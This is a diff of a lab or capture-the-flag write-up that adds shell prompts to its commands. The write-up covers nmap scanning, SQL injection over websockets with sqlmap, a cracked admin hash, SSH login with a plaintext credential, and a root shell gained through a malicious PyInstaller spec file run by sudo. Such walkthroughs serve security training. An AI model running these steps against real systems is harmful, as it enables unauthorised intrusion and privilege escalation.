@@ -22,8 +22,8 @@ Target was `10.10.11.206`, tun0 was `10.10.16.4`.
 Full sweep then a version scan. nmap fingerprinted `5789` as a websockets server:
 
 ```bash
-nmap -p- --min-rate 10000 10.10.11.206
-nmap -p 22,80,5789 -sCV 10.10.11.206
+$ nmap -p- --min-rate 10000 10.10.11.206
+$ nmap -p 22,80,5789 -sCV 10.10.11.206
 ```
 
 ```
@@ -99,11 +99,11 @@ data = '{"version":"%s"}' % message
 Run the middleware, then point sqlmap at the local endpoint on `8081`:
 
 ```bash
-python3 exp.py
+$ python3 exp.py
 # [+] Starting MiddleWare Server
 # [+] Send payloads in http://localhost:8081/?id=*
 
-sqlmap -u "http://127.0.0.1:8081/?id=1" --batch --dbms sqlite --dump
+$ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch --dbms sqlite --dump
 ```
 
 That dumped the `users` table. The admin password stored as an MD5 hash (`0c6ba8fffc83b419b21e47cf63ce5cfb`) cracked to a plaintext:
@@ -123,7 +123,7 @@ json, tkeller, kthomas, thomask, mike, admin
 The admin password was reused. Spraying the variants over SSH (or with crackmapexec / netexec), `tkeller` matched:
 
 ```bash
-ssh tkeller@10.10.11.206
+$ ssh tkeller@10.10.11.206
 # tkeller:denjanjade122566
 ```
 
@@ -134,7 +134,7 @@ tkeller held the user flag.
 `sudo -l` allowed a build script as root with no password:
 
 ```bash
-sudo -l
+$ sudo -l
 ```
 
 ```
@@ -165,8 +165,8 @@ if [[ $action == 'build' ]]; then
 A PyInstaller `.spec` file is just Python that PyInstaller imports and executes at build time, so I put a shell escape in it:
 
 ```bash
-echo 'import os; os.system("/bin/sh")' > pwn.spec
-sudo /usr/local/sbin/build-installer.sh build pwn.spec
+$ echo 'import os; os.system("/bin/sh")' > pwn.spec
+$ sudo /usr/local/sbin/build-installer.sh build pwn.spec
 ```
 
 PyInstaller imported the spec and ran my code as root:
